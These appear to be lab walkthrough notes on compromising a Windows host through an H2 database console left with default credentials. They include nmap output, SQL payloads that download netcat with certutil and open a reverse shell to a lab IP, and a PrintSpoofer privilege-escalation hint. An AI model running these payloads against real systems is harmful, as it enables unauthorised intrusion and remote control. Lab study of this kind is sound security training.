80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

port 8082. default credentials sa and empty password
<img width="1135" height="480" alt="image" src="https://github.com/user-attachments/assets/f0e3ee10-9998-4200-92d9-6e8663b240b2" />

use https://www.exploit-db.com/exploits/49384
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.167:8000/nc.exe C:/Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/nc.exe -e cmd.exe 192.168.45.167 4444").getInputStream()).useDelimiter("\\Z").next()');

whoami /priv shows SeImpersonatePrivilege -> printspoofer
<img width="837" height="258" alt="image" src="https://github.com/user-attachments/assets/8aa642e8-1599-4e9e-bfc8-6ff42f8dd920" />
